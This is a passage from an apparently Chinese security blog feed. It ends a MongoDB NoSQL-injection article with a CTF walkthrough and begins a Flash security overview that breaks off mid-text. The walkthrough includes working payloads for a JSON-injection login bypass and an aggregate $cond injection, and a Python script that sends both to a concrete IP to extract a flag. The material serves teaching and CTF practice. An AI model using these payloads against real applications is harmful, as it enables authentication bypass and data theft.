class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">"/vendor/autoload.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;users;</span><br><span class="line">    $raw_query = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">    $document = $collection-&gt;findOne(json_decode($raw_query));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($document) &amp;&amp; <span class="keyword">isset</span>($document-&gt;password)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_COOKIE[<span class="string">'username'</span>], $_COOKIE[<span class="string">'password'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $user = auth($_POST[<span class="string">'username'</span>], $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($user) &#123;</span><br><span class="line">        setcookie(<span class="string">'username'</span>, $_POST[<span class="string">'username'</span>]);</span><br><span class="line">        setcookie(<span class="string">'password'</span>, $_POST[<span class="string">'password'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，以POST方式提交登录表单参数，然后直接拼接到Json格式的数组中，经过json_decode()处理后传入findOne()函数中执行查询操作，若存在则设置Cookie。</p><p>构造的关键在于json_decode()，如果没有该函数处理还可以使用PHP数组注入的方式来注入如<code>username=admin&amp;password[$ne]=1</code>来绕过，但这里由于json_decode()的存在而不行，利用点在于该函数会给变量赋最后一次赋值的值，我们可以本地试下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = <span class="string">'1'</span>;</span><br><span class="line">$password = <span class="string">'","password":&#123;"$ne":null&#125;,"username":"admin'</span>;</span><br><span class="line">$json = <span class="string">'&#123;"username": "'</span>.$username.<span class="string">'", "password": "'</span>.$password.<span class="string">'"&#125;'</span>;</span><br><span class="line">$obj = json_decode($json);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"username is "</span>.$obj-&gt;&#123;<span class="string">"username"</span>&#125;);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：“username is admin”。</p><p>知道这个特性，我们就可以构造如下payload绕过登录认证：</p><p><code>username=1&amp;password=&quot;,&quot;password&quot;:{&quot;$ne&quot;:null},&quot;username&quot;:&quot;admin</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/34.png" alt=""></p><p>当点击category链接的时候，传入filter参数值$category，显示出来包括flags文章的标题名等内容：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/35.png" alt=""></p><p>当点击publicity链接的时候，传入filter参数值$public：</p><p><img src="/2019/08/11/NoSQL注入之MongoDB/36.png" alt=""></p><p>登录认证绕过之后，再看下第二部分的代码逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filter = $_GET[<span class="string">'filter'</span>];</span><br><span class="line"></span><br><span class="line">    $collection = (<span class="keyword">new</span> MongoDB\Client(<span class="string">'mongodb://localhost:27017/'</span>))-&gt;test-&gt;news;</span><br><span class="line"></span><br><span class="line">    $pipeline = [</span><br><span class="line">        [<span class="string">'$group'</span> =&gt; [<span class="string">'_id'</span> =&gt; <span class="string">'$category'</span>, <span class="string">'count'</span> =&gt; [<span class="string">'$sum'</span> =&gt; <span class="number">1</span>]]],</span><br><span class="line">        [<span class="string">'$sort'</span> =&gt; [<span class="string">'count'</span> =&gt; <span class="number">-1</span>]],</span><br><span class="line">        [<span class="string">'$limit'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $filters = [</span><br><span class="line">        [<span class="string">'$project'</span> =&gt; [<span class="string">'category'</span> =&gt; $filter]]</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $cursor = $collection-&gt;aggregate(array_merge($filters, $pipeline));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($filter)): <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">foreach</span> ($cursor <span class="keyword">as</span> $category) &#123;</span><br><span class="line">                printf(<span class="string">"%s has %d news&lt;br&gt;"</span>, $category[<span class="string">'_id'</span>], $category[<span class="string">'count'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接收filter参数，然后调用MongoDB聚合函数aggregate()来处理数据，其中限制了显示数为5。我们看下传入参数filter的调用过程：_id =&gt; \$category =&gt; \$filter，并在后面通过\$category[‘_id’]输出出来，其中输出语句中的\$category为集合数组中的元素。也就是说，我们输入的filter内容会输出的页面上。</p><p>下面就涉及到MongoDB的知识点了。</p><p>在使用aggregate()聚合函数时，在里面是可以使用条件判断语句的。在MongoDB中\$cond表示if判断语句，匹配的符号使用\$eq，连起来为<code>[$cond][if][$eq]</code>，当使用多个判断条件时重复该语句即可。官网的例子是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">db.inventory.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             item: 1,</span><br><span class="line">             category:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $gte: [ &quot;$qty&quot;, 250 ] &#125;, then: 30, else: 20 &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>那么就可以参考着构造语句了。由前面知道当提交?filter=\$category时会出现flags字样，那么就可以在if判断条件中设置当前\$category的值是否为flags，当为flags时输出\$title内容（从源码中可看出集合含有\$title属性），否则原样输出\$category。最后整个构造结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">db.news.aggregate(</span><br><span class="line">   [</span><br><span class="line">      &#123;</span><br><span class="line">         $project:</span><br><span class="line">           &#123;</span><br><span class="line">             category:</span><br><span class="line">               &#123;</span><br><span class="line">                 $cond: &#123; if: &#123; $eq: [ &quot;$category&quot;, &quot;flags&quot; ] &#125;, </span><br><span class="line">                 then: $title, </span><br><span class="line">                 else: $category &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>转换成PHP数组形式传入filter参数：</p><p><code>?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$title&amp;filter[$cond][else]=$category</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/37.png" alt=""></p><p>可以看到，原本输出\$category值为flags的地方替换了为flags对应的\$title值，说是这时一个flag文本。以此推测，该集合应该还存在一个text的属性，接着直接修改\$title为\$text查看：</p><p><code>?filter[$cond][if][$eq][]=flags&amp;filter[$cond][if][$eq][]=$category&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=$category</code></p><p><img src="/2019/08/11/NoSQL注入之MongoDB/38.png" alt=""></p><p>可以看到，该集合确实存在text属性，且该值即为flag。</p><p>当然有利用脚本，原理都一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">'username'</span>:<span class="string">'admin'</span>,</span><br><span class="line">  <span class="string">'password'</span>:<span class="string">'","password":&#123;"$ne":null&#125;,"username":"admin'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#login</span></span><br><span class="line">response = s.post(<span class="string">'http://173.199.118.226/index.php'</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">response = s.post(<span class="string">'http://173.199.118.226/index.php?filter[$cond][if][$eq][][$strLenBytes]=$title&amp;filter[$cond][if][$eq][][$toInt]=19&amp;filter[$cond][then]=$text&amp;filter[$cond][else]=12'</span>, data=data)</span><br><span class="line">print(bytes(response.content).decode())</span><br></pre></td></tr></table></figure><h2 id="0x08-防御"><a href="#0x08-防御" class="headerlink" title="0x08 防御"></a>0x08 防御</h2><p>对于外部输入拼接查询语句的内容，对特殊字符进行严格的过滤或转移，如$符；</p><p>对于JavaScript注入，$where和Command方法能不用就尽量不用；</p><h2 id="0x09-工具"><a href="#0x09-工具" class="headerlink" title="0x09 工具"></a>0x09 工具</h2><p>Github上有个叫NoSQLAttack工具，具体的参考：<a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a></p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p><a href="https://www.secpulse.com/archives/3278.html" target="_blank" rel="noopener">Mongodb注入攻击</a></p><p><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">冷门知识 — NoSQL注入知多少</a></p><p><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#NopeSQL" target="_blank" rel="noopener">CyBRICS-CTF-Quals-2019-Web-Writeup</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SQL注入" scheme="https://www.mi1k7ea.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="MongoDB" scheme="https://www.mi1k7ea.com/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>Flash安全总结</title>
    <link href="https://www.mi1k7ea.com/2019/08/10/Flash%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/08/10/Flash安全总结/</id>
    <published>2019-08-10T01:58:03.000Z</published>
    <updated>2019-08-10T09:40:47.959Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Flash简介"><a href="#0x01-Flash简介" class="headerlink" title="0x01 Flash简介"></a>0x01 Flash简介</h2><p>Adobe Flash是一种交互式矢量多媒体技术，被广泛应用于Web网站中，以增加特殊的动画效果和网页交互能力。</p><h3 id="Flash-Player与SWF"><a href="#Flash-Player与SWF" class="headerlink" title="Flash Player与SWF"></a>Flash Player与SWF</h3><p>要想运行Flash程序，浏览器中必须安装Flash Player或Shockwave Player。</p><p>Flash Player是一款多媒体程序播放器，能够在各种浏览器、OS和移动设备上使用，兼容性高，应用广泛。</p><p>SWF（Shock Ware Flash）是Flash的专用格式，使用Flash Player即可运行SWF文件。此外，SWF文件可以直接嵌入到网页中去执行。</p><p>浏览器中SWF解释器如图：</p><p><img src="/2019/08/10/Flash安全总结/1.png" alt=""></p><p>可看到浏览器运行Flash应用程序的步骤：</p><ol><li>浏览器解析HTML页面；</li><li>解析嵌入的Flash插件；</li><li>Flash插件解析SWF字节码；</li><li>插件和浏览器通过LiveConnect接口进行交互；</li></ol><h3 id="ActionScript语言"><a href="#ActionScript语言" class="headerlink" title="ActionScript语言"></a>ActionScript语言</h3><p>ActionScript（简称AS）是由Macromedia（现已被Adobe收购）为其Flash产品开发的 ，最初是一种简单的脚本语言，现在最新版本ActionScript3.0，是一种完全的面向对象的编程语言，功能强大，类库丰富，语法类似JavaScript，多用于Flash互动性、娱乐性、实用性开发，网页制作和RIA（丰富互联网程序）开发。</p><p>目前，网上大多数Flash都是应用ActionScript2或ActionScript3来编写的。</p><p>一般是使用Adobe Flash CS系列的软件直接进行AS代码的编写和编译。</p><h3 id="SWF文件编译与反编译"><a href="#SWF文件编译与反编译" class="headerlink" title="SWF文件编译与反编译"></a>SWF文件编译与反编译</h3><p>具体可参考之前的博文：<a href="https://www.mi1k7ea.com/2019/07/21/Flash%E5%9E%8BXSS%E5%B0%8F%E7%BB%93/#swf%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91">https://www.mi1k7ea.com/2019/07/21/Flash%E5%9E%8BXSS%E5%B0%8F%E7%BB%93/#swf%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91</a></p><h3 id="嵌入Flash文件"><a href="#嵌入Flash文件" class="headerlink" title="嵌入Flash文件"></a>嵌入Flash文件</h3><p>在HTML页面中嵌入Flash，一般使用object和embed标签。</p><p>（1）使用embed标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"filename.swf"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-flash"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>embed标签支持Mozilla系列的浏览器或其他支持Netscape插件的浏览器，IE也能识别。</p><p>（2）使用object标签：</p><p>IE下嵌入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">codeBase</span>=<span class="string">"http://fpdownload.macromedia.com/get/Flashplayer/current/swFlash.cab#version=8,0,0,0"</span> <span class="attr">classid</span>=<span class="string">"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"http://example.com/exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>非IE下嵌入（IE8能成功，本地最新IE11也OK）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-Flash"</span> <span class="attr">data</span>=<span class="string">"./exp.swf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span> = <span class="string">"./exp.swf"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowScriptAccess"</span> <span class="attr">value</span>=<span class="string">"always"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"allowNetworking"</span> <span class="attr">value</span>=<span class="string">"all"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>object标签用于引入对象，如图像、音频、视频、Java Applets、ActiveX、PDF以及Flash，用于IE系列或其他支持ActiveX控件的浏览器。</p><p>（3）使用object+embed标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">classid</span>=<span class="string">"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</span> <span class="attr">codebase</span>=<span class="string">"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"movie"</span> <span class="attr">value</span>=<span class="string">"filename.swf"</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"wmode"</span> <span class="attr">value</span>=<span class="string">"transparent"</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">"filename.swf"</span> <span class="attr">width</span>=<span class="string">"200"</span> <span class="attr">height</span>=<span class="string">"100"</span> <span class="attr">type</span>=<span class="string">"application/x-shockwave-flash"</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了确保大多数浏览器能正常显示Flash，建议把embed标签嵌套放在object标签内。</p><h2 id="0x02-Flash安全模型"><a href="#0x02-Flash安全模型" class="headerlink" title="0x02 Flash安全模型"></a>0x02 Flash安全模型</h2><p>随着Flash功能越来越丰富，使用越来越广泛，导致Flash的安全问题也越来越多，因此就诞生了Flash安全模型，其主要提供以下几个方面的功能：</p><ul><li>利用沙箱控制和阻止外部Flash之间的交互和访问；</li><li>控制浏览器和Flash之间的交互和访问；</li><li>控制其他外部资源的访问；</li><li>控制对其他服务器的通信；</li></ul><h3 id="Flash安全沙箱"><a href="#Flash安全沙箱" class="headerlink" title="Flash安全沙箱"></a>Flash安全沙箱</h3><p>Flash安全模型使用沙箱来定义各个Flash应用程序可以访问的数据以及操作的范围。</p><p>看图理解下：</p><p><img src="/2019/08/10/Flash安全总结/2.png" alt=""></p><p>安全域是Flash中最顶级的沙箱，安全域链接到内容的来源域名，比如a.com下的SWF文件包含一个链接到a.com的安全域，而b.com下的SWF文件则有一个链接到b.com的安全域。不同的安全域使得SWF文件在Flash Player中播放时运行在自身的沙箱下；</p><p>如果两个SWF文件分别处于不同的安全域，则任何一个SWF中的数据都不可以被另一个SWF获取，如a1.swf只能与同域下的a2.swf文件通信，b1.swf只能与同域下的b2.swf文件通信，若尝试获取其他域的SWF文件则会报错；</p><p>若想让两个处于不同安全域下的SWF文件通信，可以通过授权来实现。通过授权后，某个安全域内的文件即可获取另一个域内的文件数据。在AS中，SWF文件的授权是通过Security.allowDomain()函数来设置的，这个方法是应用于swf文件跨域加载swf文件并访问其内部属性、方法、类等的场景。</p><p><strong>HTML参数权限机制API</strong></p><p>在HTML页面嵌入Flash时，其中的Object和Embed标签都有allowScriptAccess参数和allowNetworking参数，主要是用于在HTML页面调用执行Flash文件的场景。</p><p>allowScriptAccess：控制html页面与Flash页面的通讯。</p><ul><li>always：html和Flash页面的通讯不做任何的限制；</li><li>samedomain：html和Flash同域的时候可以做通讯【这个值是默认值】；</li><li>never：html和Flash禁止通讯。</li></ul><p>allowNetworking：控制Flash与外部的网络通讯。</p><ul><li>all：Flash所有的网络API通讯接口都可用；</li><li>internal：navigateToURL，fscommand，ExternalInterface.call不可用；</li><li>none：所有的网络API不可用。</li></ul><p>allowScriptAccess和allowNetworking实际是Flash权限机制的API，前面提过的Security.allowDomain()函数也是其中的一个。allowScriptAccess和allowNetworking都属于HTML参数权限机制API。</p><h3 id="Cross-Domain-Policy"><a href="#Cross-Domain-Policy" class="headerlink" title="Cross Domain Policy"></a>Cross Domain Policy</h3><p>如图描述：</p><p><img src="/2019/08/10/Flash安全总结/3.png" alt=""></p><p>默认情况下，在浏览器中运行的Flash程序是不允许访问其他域的数据的。为了解决这个问题，唯一方式就是跨域策略文件crossdomain.xml，其是放置在网站的Web根目录下，而该文件的内容必须遵从XML格式，如上图示例。</p><p>crossdomain.xml文件主要包含如下几个节点：</p><ul><li>site-control：通过检查该节点的属性值，确认是否可以允许加载其他策略文件；</li><li>allow-access-from：通过检查该节点的domain属性值，确认是否为允许访问的域名；</li><li>allow-access-from-identity：配置跨域访问策略为允许有特定证书的来源跨域访问本域上的资源；</li><li>allow-http-request-headers-from：授权第三方域的Flash向本域发送用户定义的HTTP头；</li></ul><p>常用的节点为allow-access-from，用来指明允许本域资源允许被哪些域名的Flash跨域请求。</p><p>默认情况下，Flash不加载除主策略文件之外的其他策略文件，但是设置了permitted-cross-domain-policies的by-content-type相关属性后，黑客就能通过上传文件来定义自己的策略文件。</p><h3 id="设置管理器"><a href="#设置管理器" class="headerlink" title="设置管理器"></a>设置管理器</h3><p>在本地硬盘运行的SWF文件也有自己的安全域，可以通过Flash Player的设备管理器来设置。设备管理器允许用户为客户端PC上执行的Flash程序制定各种安全性、隐私和资源使用设置。</p><p>通过Flash Player设置管理器，可以管理全局保密性设置、存储设置、安全设置和自动通知设置等。</p><h2 id="0x03-Flash-XSS"><a href="#0x03-Flash-XSS" class="headerlink" title="0x03 Flash XSS"></a>0x03 Flash XSS</h2><p>Flash XSS主要有以下两种方式：</p><ul><li>与JavaScript通信引发的XSS；</li><li>加载第三方资源引发的XSS（如SWF文件或XML文件）；</li></ul><p>具体的原理和攻击利用可参考：<a href="https://www.mi1k7ea.com/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></p><h2 id="0x04-Flash-CSRF"><a href="#0x04-Flash-CSRF" class="headerlink" title="0x04 Flash CSRF"></a>0x04 Flash CSRF</h2><p>Flash CSRF在于：如果目标站点的crossdomain.xml中domain值为*或者其中某些domain下的站可被攻击者利用来上传Flash文件等，那么攻击者可以诱使受害者用户访问攻击页面，进而通过触发Flash请求某个用户当前浏览器已登录的页面，从中提取出CSRF的token或者页面的其他敏感信息，造成CSRF攻击。</p><p>具体的原理和攻击利用可参考：<a href="https://www.mi1k7ea.com/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></p><h2 id="0x05-XSF"><a href="#0x05-XSF" class="headerlink" title="0x05 XSF"></a>0x05 XSF</h2><p>XSF（Cross Site Flash）跨站Flash攻击，就是使用ActionScript加载第三方的Flash文件时，攻击者能控制这个第三方的Flash文件，这样就有可能造成XSF攻击，情况分为以下两种：</p><ul><li>当一个Flash文件调用某个函数如loadMovie()加载其他域的Flash文件时；</li><li>当HTML页面使用*Script去加载解析一个Flash文件时；</li></ul><p>以下函数如果使用不当就很容易产生XSF问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">loadVariables()</span><br><span class="line">loadMovie()</span><br><span class="line">loadMovieNum()</span><br><span class="line">FScrollPane.loadScrollContent()</span><br><span class="line">LoadVars.send()</span><br><span class="line">XML.load(&apos;URL&apos;)</span><br><span class="line">LoadVars.load(&apos;url&apos;)</span><br><span class="line">Sound.loadSound(&apos;url&apos;)</span><br><span class="line">NetStream.play(&apos;url&apos;)</span><br></pre></td></tr></table></figure><p>通过这些恶意接口，可以指定URL为我们构造的恶意文件如swf或xml文件，从而在目标网站实现JS攻击。</p><p>漏洞示例代码如图，_root是AS2参数传递的关键字，这里loadMovieNum()函数参数可由外部传入，导致可以在URL栏输入参数来加载攻击者的恶意SWF文件，造成XSF攻击：</p><p><img src="/2019/08/10/Flash安全总结/8.png" alt=""></p><h2 id="0x06-FPI"><a href="#0x06-FPI" class="headerlink" title="0x06 FPI"></a>0x06 FPI</h2><p>FPI（Flash Parameter Injection）Flash参数型注入攻击，是一种动态注入Flash的全局参数的攻击技巧。</p><p>网页中的Flash是直接嵌入到HTML中的，因此不能被URI加载，但由于Flash的一些全局参数是可以通过URI的方式来设置的，因此如果攻击者能访问和控制值Flash的全局参数，就能进行Flash XSS和XSF等攻击了。</p><h3 id="反射型FPI"><a href="#反射型FPI" class="headerlink" title="反射型FPI"></a>反射型FPI</h3><p>和反射型XSS类似，攻击者可以通过外部输入参数来传入恶意内容，而传入的参数直接拼接到了生成HTML页面的代码中，造成反射型FPI。</p><p>在下面的代码中，Flash视频的名称是从请求的表单或URL参数获取的，并且被放在了生成HTML页面中，攻击者可能通过下面的URL覆盖一些Flash全局参数：</p><p><img src="/2019/08/10/Flash安全总结/4.png" alt=""></p><h3 id="附带FlashVars的反射型FPI"><a href="#附带FlashVars的反射型FPI" class="headerlink" title="附带FlashVars的反射型FPI"></a>附带FlashVars的反射型FPI</h3><p>这种方式使用FlashVars属性，该属性可以在object标签中指定，用来传递全局Flash参数。在AS2中，FlashVars会被自动导入到Flash程序的变量空间。当FlashVars属性可由外部控制时，存在反射型FPI。</p><p>漏洞示例代码如图，其中%26为&amp;的URL编码：</p><p><img src="/2019/08/10/Flash安全总结/5.png" alt=""></p><h3 id="FlashVars注入"><a href="#FlashVars注入" class="headerlink" title="FlashVars注入"></a>FlashVars注入</h3><p>当任意的object标签的属性作为参数接收时，都可能会导致这种攻击。</p><p>漏洞示例代码如图，width参数未经过过滤，直接传递到输出的HTML页面中，导致了攻击者可以注入FlashVars：</p><p><img src="/2019/08/10/Flash安全总结/6.png" alt=""></p><h3 id="DOM型FPI"><a href="#DOM型FPI" class="headerlink" title="DOM型FPI"></a>DOM型FPI</h3><p>当document.location变量被用作Flash参数的时候，会导致此类攻击。</p><p>漏洞示例代码如图，这里有两个变量传递给Flash，一个是location、值为<code>http://host/index.htm</code>，另一个是globalVar、值为evil：</p><p><img src="/2019/08/10/Flash安全总结/7.png" alt=""></p><h2 id="0x07-伪造HTTP头"><a href="#0x07-伪造HTTP头" class="headerlink" title="0x07 伪造HTTP头"></a>0x07 伪造HTTP头</h2><p>可以使用ActionScript编写伪造HTTP头字段的请求，将该as代码编译成swf文件然后诱使用户访问导致CSRF或攻击者自己某些情况下伪造HTTP头字段进行发包都是OK的：</p><p><img src="/2019/08/10/Flash安全总结/9.png" alt=""></p><h2 id="0x08-Flash钓鱼"><a href="#0x08-Flash钓鱼" class="headerlink" title="0x08 Flash钓鱼"></a>0x08 Flash钓鱼</h2><p>这里并非是Flash本身的漏洞利用，而是将Flash作为钓鱼攻击的一种载体进行利用，因此这里不多说，具体可见：<a href="https://book.2cto.com/201310/34314.html。" target="_blank" 